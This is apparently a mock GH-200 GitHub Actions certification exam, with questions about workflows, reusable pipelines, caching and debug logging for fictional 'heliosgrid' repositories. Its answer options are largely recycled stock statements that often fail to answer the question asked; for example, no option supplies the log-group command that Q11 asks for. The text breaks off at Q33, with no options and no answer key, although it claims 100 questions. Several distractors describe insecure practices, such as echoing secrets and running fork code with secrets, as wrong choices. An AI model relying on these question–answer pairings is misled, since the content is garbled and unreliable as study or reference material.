# Microsoft / GitHub Exam GH-200: GitHub Actions — Full-Length Mock Exam 2

**Theme:** Workflow Consumption, Log Diagnostics & Reusable Pipelines — Debug Secrets, Matrix Re-Runs, Starter Templates & Nested workflow_call  
**Credential:** `GitHub Actions` *(Intermediate · **no prerequisite** · **2-year validity** transitioning to Microsoft Learn recertification)*  
**Study guide baseline:** `January 2026 (Last updated February 5, 2026)` (https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)  
**Questions:** `100` (`84` `multiple-choice` balanced `21/21/21/21` across A–D + `16` `multi-select`; `0` case studies)  
**Recommended timing:** `100 minutes` (matching Microsoft’s published `100-minute` GH-200 assessment duration · **closed-book: no Microsoft Learn or GitHub Docs access**)

> **Disclaimer:** Independent educational material authored from public Microsoft Learn and GitHub Actions documentation — not affiliated with or endorsed by Microsoft Corporation or GitHub, Inc. Practice percentages do not equate to Microsoft’s `700 / 1000` scaled score.

## Questions

---

## Domain 1 — Author and manage workflows (20–25% official weight · 24 questions)

### 1. HeliosGrid Telemetry schedules a nightly substation drift check (`on: schedule: [{ cron: '0 3 * * *' }]`) exclusively on feature branch `dev/substation` while `main` remains the repository default branch. Proposed solution: Keep `drift.yml` committed only on `dev/substation` so GitHub's cron scheduler triggers it at 03:00 UTC nightly. Does this meet the goal?

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)

### 2. In `heliosgrid/grid-ingest`, workflow `pr-gate.yml` declares `on: pull_request` with NO explicit `types:` array, and `merge-check.yml` supports GitHub Merge Queue validation before commits land on `main`. Which two trigger behaviors apply? Select two.

- **A.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **B.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 3. HeliosGrid Telemetry runs firmware deployment jobs to physical substation gateways (`environment: substation-west`) and must guarantee that two queued runs NEVER deploy to `substation-west` simultaneously, WITHOUT canceling the queued deployment waiting behind an active rollout. Complete `concurrency: { group: deploy-substation-west, ____: false }`.

- **A.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 4. In `heliosgrid/dispatch-hub`, you configure workflow-level `defaults: run: { shell: bash, working-directory: services/hub }` and `env: RUST_BACKTRACE: '1'`, while step `win-helper` overrides `working-directory: tools/win`. Which two scoping rules apply? Select two.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **E.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **F.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`

### 5. HeliosGrid Telemetry authors reusable workflow `heliosgrid/ci-templates/.github/workflows/firmware-sign.yml` (`on: workflow_call`). When an operator tries to trigger `firmware-sign.yml` manually from the Actions UI `Run workflow` dropdown, no button appears. What minimal change lets BOTH human operators in the UI and caller workflows invoke `firmware-sign.yml`?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 6. HeliosGrid Telemetry centralizes C++ firmware packaging in `heliosgrid/ci-templates/.github/workflows/pack-elf.yml` and needs downstream repo `heliosgrid/rtu-agent` to pass target board inputs + signing secrets and consume the resulting firmware checksum output. Order the end-to-end reusable workflow wiring steps.

- **A.** Place the reusable workflow outside `.github/workflows/` → Call it inside `steps:` instead of `jobs.<id>.uses` → Omit `on.workflow_call.outputs` mapping → Expect secrets to pass implicitly without `secrets:`
- **B.** Invoke `uses:` without `on: workflow_call` in callee → Write values to `$GITHUB_ENV` hoping they cross jobs → Read `steps.ci.outputs` across separate runner VMs → Pass sensitive secrets via plaintext `with:` inputs
- **C.** Declare `on: workflow_call` (`inputs`, `secrets`, `outputs`) in callee → Write callee step result to `$GITHUB_OUTPUT` & job `outputs` → Invoke `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:` → Read `needs.<id>.outputs.<key>` downstream
- **D.** Read `needs.<id>.outputs` before running the callee job → Declare `on: workflow_dispatch` only in the callee → Emit outputs with retired `::set-output` syntax → Hardcode org secrets inside YAML

### 7. In `heliosgrid/meter-sync`, step `upload-crash-logs` inside job `hil-test` should execute ONLY when an earlier step in `hil-test` failed (`and NOT when all steps succeeded or when the run was canceled`). Complete the step condition: `if: ____`.

- **A.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 8. A hardware-in-the-loop step `flash-bench` in `heliosgrid/grid-ingest` occasionally deadlocks serial I/O, hanging the entire 60-minute job even though flashing normally finishes in 90 seconds. Complete the step-level YAML key `____: 4` that bounds ONLY `flash-bench` to 4 minutes.

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`

### 9. In `heliosgrid/dispatch-hub`, job `canary-check` runs ONLY on `main` (`if: github.ref == 'refs/heads/main'`), so on PRs `canary-check` is `skipped`. Downstream job `summary-gate` lists `needs: [unit-test, canary-check]` and unexpectedly gets `skipped` on PRs. Complete `if: !failure() && !cancelled() && ____ == 'success'` on `summary-gate`.

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 10. Inside `heliosgrid/meter-sync`, job `plan-shards` runs `echo "SHARD_COUNT=8" >> "$GITHUB_ENV"` and downstream job `test-shards` (`needs: plan-shards`) runs `pytest -n "$SHARD_COUNT"`. Proposed solution: Write `SHARD_COUNT=8` to `$GITHUB_ENV` in `plan-shards` so `test-shards` inherits `$SHARD_COUNT` automatically across runner VMs. Does this meet the goal?

- **A.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`

### 11. A CMake build step in `heliosgrid/rtu-agent` emits 1,400 compiler lines and wants to wrap linker diagnostics inside a collapsible log section in the Actions step viewer. Complete the paired workflow commands: `echo "____Linker Diagnostics"` before the command and `echo "::endgroup::"` after it.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 12. HeliosGrid Telemetry's security engineering team reviews bash steps that write untrusted multi-line changelog text into `$GITHUB_OUTPUT` and mask generated tokens. Which three implementation rules prevent delimiter injection and retired-command failures? Select three.

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Write step outputs to `>> "$GITHUB_OUTPUT"` (`mapped via jobs.<id>.outputs`) so downstream `needs:` jobs read `needs.<id>.outputs.<name>`
- **E.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 13. In `heliosgrid/grid-ingest`, job `mqtt-integration` specifies BOTH `container: python:3.12-slim` AND `services: mosquitto: { image: eclipse-mosquitto:2 }` on `ubuntu-24.04`. Unlike host-runner jobs, how do steps inside `container: python:3.12-slim` connect to the `mosquitto` service container?

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 14. HeliosGrid Telemetry's integration job pulls private TimescaleDB service image `ghcr.io/heliosgrid/timescale-fixture:16` hosted in a private GHCR namespace. Complete the `services.timescale` auth block `____: { username: ${{ github.actor }}, password: ${{ secrets.GITHUB_TOKEN }} }`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`

### 15. HeliosGrid Telemetry maintains legacy build scripts referencing retired `runs-on: ubuntu-20.04` and `runs-on: windows-2019` images. Complete the modern replacement labels `runs-on: ____` (`Ubuntu 24.04 LTS`) and `runs-on: windows-2025` (`windows-latest`).

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 16. In `heliosgrid/firmware-sdk`, you configure `strategy: { fail-fast: false, max-parallel: 2, matrix: { arch: [arm-none-eabi, riscv64], profile: [debug, release], include: [{ arch: x86_64, profile: sim, sanitizer: asan }] } }`. Which two behaviors occur? Select two.

- **A.** Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)
- **B.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **E.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **F.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 17. In `heliosgrid/meter-sync/.github/workflows/ci.yml`, you factor repeated matrix OS arrays using `x-platforms: &linux_targets [ubuntu-22.04, ubuntu-24.04]`? Wait — GitHub Actions workflow schema rejects unknown top-level `x-*` keys! Where inside `.github/workflows/ci.yml` CAN you define `&linux_targets` cleanly without violating workflow schema?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file

### 18. A build step in `heliosgrid/rtu-agent` needs temporary scratch directory path outside `$GITHUB_WORKSPACE` that is guaranteed clean per job on both Linux (`/home/runner/work/_temp`) and Windows (`D:\a\_temp`) runners. Complete the context expression: `${{ ____ }}` (`paired with $RUNNER_TEMP in shell`).

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`

### 19. In `heliosgrid/dispatch-hub`, a workflow references `uses: docker://alpine:3.20` for a container step in production. To make that Docker image reference cryptographically immutable like 40-char Git SHA pinning, how should `uses:` reference the container image?

- **A.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 20. In `heliosgrid/grid-ingest`, a step must run ONLY when pull request labels include `'run-hil'` OR commit message starts with `'[hil]'`, evaluated case-insensitively. Complete the built-in expression functions: `if: ____(github.event.pull_request.labels.*.name, 'run-hil') || ____(github.event.head_commit.message, '[hil]')`.

- **A.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 21. An engineer editing `.github/workflows/release.yml` in VS Code with the official GitHub Actions extension hovers over `${{ vars.MQTT_BROKER }}` and `uses: heliosgrid/sign-action@v1`. When signed into GitHub in VS Code, what repository metadata does the extension surface inline without running the workflow?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management

### 22. In `heliosgrid/meter-sync`, PR branch `feat/modbus` runs `actions/cache@v4` with `key: pip-linux-${{ hashFiles('requirements.lock') }}` and `restore-keys: ['pip-linux-']`, experiencing a cache miss on `feat/modbus` because `requirements.lock` changed. Which branch caches can `feat/modbus` read from during cache restore?

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 23. In `heliosgrid/rtu-agent`, job `compile-arm` produces a `42 MB` binary `rtu-firmware.bin` and a 64-char SHA-256 hex string that job `hardware-test` (`needs: compile-arm`) needs on a separate self-hosted runner. What is the clean, idiomatic way to pass BOTH items from `compile-arm` to `hardware-test`?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 24. A step in `heliosgrid/dispatch-hub` writes `2.4 MB` of raw HTML/Markdown telemetry into `$GITHUB_STEP_SUMMARY` and fails step post-processing. What per-step size limit applies to `$GITHUB_STEP_SUMMARY`, and how can a step clear an earlier summary written in the SAME step?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

---

## Domain 2 — Consume and troubleshoot workflows (15–20% official weight · 19 questions)

### 25. Public repository `heliosgrid/open-modbus` wants external fork PRs to run unit tests safely. An engineer configures `on: pull_request_target` combined with `uses: actions/checkout@v4` (`with: ref: ${{ github.event.pull_request.head.sha }}`) and `run: pytest`. Proposed solution: Use `pull_request_target` with explicit checkout of `pull_request.head.sha` so fork tests run with full repo secrets. Does this meet the goal?

- **A.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`

### 26. In `heliosgrid/grid-ingest`, workflow `ci.yml` defines `on: { push: { branches: [main] }, pull_request: { branches: [main] } }`. When an internal developer opens a PR from `heliosgrid/grid-ingest:feat/parser` targeting `main` and pushes a commit to `feat/parser`, how many runs of `ci.yml` start?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **D.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)

### 27. During a workflow cancellation test in `heliosgrid/meter-sync`, a long-running Python consumer step exits with code `143` right after `concurrency: cancel-in-progress: true` triggers. What does process exit code `143` indicate on Linux runners?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)

### 28. You trigger `Re-run jobs` from the GitHub Actions web UI on a failed run in `heliosgrid/rtu-agent` and check `Enable debug logging`. Does checking `Enable debug logging` permanently create `ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG` secrets for future commits on `main`?

- **A.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 29. An intermittent TLS handshake failure breaks 1 out of 16 jobs in `heliosgrid/dispatch-hub`. Which two troubleshooting actions capture maximum diagnostic detail while minimizing runner cost? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Use `Re-run failed jobs` with `Enable debug logging` (`setting ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) to diagnose flaky variants cleanly
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **E.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 30. In `heliosgrid/grid-ingest/.github/workflows/matrix.yml`, job `build-linux` defines `env: &common_vars { CC: clang-18, CFLAGS: "-O2", WARN: "1" }` and job `build-asan` writes `env: { CFLAGS: "-O1 -fsanitize=address", <<: *common_vars }`. According to YAML merge-key (`<<:`) semantics, what value does `env.CFLAGS` take in `build-asan`?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **C.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 31. A developer tries to merge two YAML sequence arrays (`steps:`) in `.github/workflows/ci.yml` by writing `steps: { <<: *checkout_steps }` and receives a YAML schema/type error. Why does `<<:` fail on `steps:`?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **D.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults

### 32. A workflow run in `heliosgrid/meter-sync` finished `35 days` ago (`within the 90-day log retention window`) and a release engineer tries to hit `Re-run failed jobs`, finding the re-run button disabled. Why is re-running blocked on a 35-day-old workflow run?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 33. In `heliosgrid/rtu-agent`, a cross-compiler matrix (`arm-none-eabi`, `aarch64`, `riscv64` × `ubuntu-22.04`, `ubuntu-24.04`) fails only on `(riscv64, ubuntu-24.04)`. Place the matrix triage and selective debug re-run workflow in exact order.

